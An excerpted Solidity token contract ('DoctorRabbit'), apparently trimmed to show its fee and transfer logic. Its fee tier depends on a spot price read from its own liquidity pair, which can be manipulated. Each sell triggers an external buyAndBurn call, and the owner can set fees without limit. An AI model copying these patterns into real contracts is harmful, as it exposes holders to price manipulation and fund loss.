...
contract newToken is Context, IERC20, Ownable {
    ...
    string private _name = "DoctorRabbit"; 
    string private _symbol = "DoctorRabbit"; 
    ...
    uint256 private numTokensSellToAddToLiquidity = _tTotal.div(100000); 
    address public constant blackHole = 0x000000000000000000000000000000000000dEaD;
	address private dead = 0x000000000000000000000000000000000000dEaD;
	address public bonusToken = 0x55d398326f99059fF775485246999027B3197955;
    uint256 private enterCount = 0;
	TokenDistributor public _tokenDistributor;
    uint256 public feeLiquidityBuy = 2;
	uint256 public feeLiquiditySell = 2;
	uint256[5] public feeOtherTokenBuy = [3,13,23,33,43];
	uint256[5] public feeOtherTokenSell = [3,13,23,33,43];
	uint256[4] private priceList = [2500000000000000000,1200000000000000000,600000000000000000,100000000000000000];
	...
	function setMining(address _Mining) public {
	...
	function setFeeOtherTokenBuy(uint256 _index, uint256 _feeOtherTokenBuy) public  {
		require(_msgSender() == owner(), "fail");
        feeOtherTokenBuy[_index] = _feeOtherTokenBuy;
    }
	
	function setPriceList(uint256 _index, uint256 _priceList) public  {
		require(_msgSender() == owner(), "fail");
        priceList[_index] = _priceList;
    }
	
	function setFeeOtherTokenSell(uint256 _index, uint256 _feeOtherTokenSell) public  {
		require(_msgSender() == owner(), "fail");
        feeOtherTokenSell[_index] = _feeOtherTokenSell;
    }
    ...
    function _getTValues(uint256 tAmount,bool _sellStatus,bool _buyStatus) private view returns (uint256 tTransferAmount, uint256 tLiquidity, uint256 tOtherToken) {
        if (!feeIt) {
            return (tAmount, 0, 0);
        }
		uint256 gLevel = getLevel();
		tOtherToken = tAmount.mul(feeOtherTokenBuy[gLevel]).div(100);
		tLiquidity = tAmount.mul(feeLiquidityBuy).div(100);

        tTransferAmount = tAmount.sub(tLiquidity).sub(tOtherToken);
    }

    function _getRValues(uint256 tAmount, uint256 tTransferAmount, uint256 tFee,uint256 tAir, uint256 currentRate) private pure returns (uint256, uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = tTransferAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
		uint256 rAir = tAir.mul(currentRate);
        return (rAmount, rTransferAmount, rFee, rAir);
    }
    ...
    function _takeTax(uint256 tLiquidity,uint256 tOtherToken) private {
		...
		_rOwned[address(Mining)] = _rOwned[address(Mining)].add(rOtherToken);
		
        if(_isExcluded[address(Mining)]) {
            _tOwned[address(Mining)] = _tOwned[address(Mining)].add(tOtherToken);
        }
	...
	function getLevel() private view returns(uint256) {
		uint256 tokenprice = getBonusSwapToken();
        if (tokenprice < priceList[3]) {
            return 4;
        }else if (tokenprice < priceList[2]) {
            return 3;
        }else if (tokenprice < priceList[1]) {
            return 2;
        }else if (tokenprice < priceList[0]) {
            return 1;
        }
        return 0;
    }
	...
	function getBonusSwapToken() private view returns(uint256) {
		uint256 thisPairBnb = IERC20(bonusToken).balanceOf(address(uniswapV2Pair));
		uint256 thisPairToken = IERC20(address(this)).balanceOf(address(uniswapV2Pair));
		if(thisPairBnb > 0 && thisPairToken > 0){
			address[] memory path = new address[](2);
			path[0] = address(this);
			path[1] = address(bonusToken);
			uint256[] memory res = uniswapV2Router.getAmountsOut(1*10 ** 18,path);
			return res[1];
		}
        return 1 * 10 ** 16;
    }
    ...
    function _transfer(
		...
		if(to == uniswapV2Pair && from != owner() && from != address(this) && from != blackHole && from != Mining ){
			IMining(Mining).buyAndBurn();
			_isSellStatus = true;
		}
        ...
        _tokenTransfer(from,to,amount,takeFee,_isSellStatus,_isBuyStatus);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee,bool isSellStatus,bool isBuyStatus) private {
        if(!takeFee)
            removeAllFee();
			
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount,isSellStatus,isBuyStatus);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount,isSellStatus,isBuyStatus);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount,isSellStatus,isBuyStatus);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount,isSellStatus,isBuyStatus);
        } else {
            _transferStandard(sender, recipient, amount,isSellStatus,isBuyStatus);
        }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool _sellStatus,bool _buyStatus) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken) = _getTValues(tAmount,_sellStatus,_buyStatus);
        (uint256 rAmount, uint256 rTransferAmount,,) = _getRValues(tAmount, tTransferAmount, 0,airnum, _getRate());
    ...
    function _transferToExcluded(address sender, address recipient, uint256 tAmount,bool _sellStatus,bool _buyStatus) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken) = _getTValues(tAmount,_sellStatus,_buyStatus);
        (uint256 rAmount, uint256 rTransferAmount,,) = _getRValues(tAmount, tTransferAmount, 0,1* 10 **3, _getRate());
    ...
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount,bool _sellStatus,bool _buyStatus) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken) = _getTValues(tAmount,_sellStatus,_buyStatus);
        (uint256 rAmount, uint256 rTransferAmount,,) = _getRValues(tAmount, tTransferAmount, 0,1* 10 **3, _getRate());
    ...
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount,bool _sellStatus,bool _buyStatus) private {
        (uint256 tTransferAmount,uint256 tLiquidity, uint256 tOtherToken) = _getTValues(tAmount,_sellStatus,_buyStatus);
        (uint256 rAmount, uint256 rTransferAmount,,) = _getRValues(tAmount, tTransferAmount, 0,1* 10 **3, _getRate());
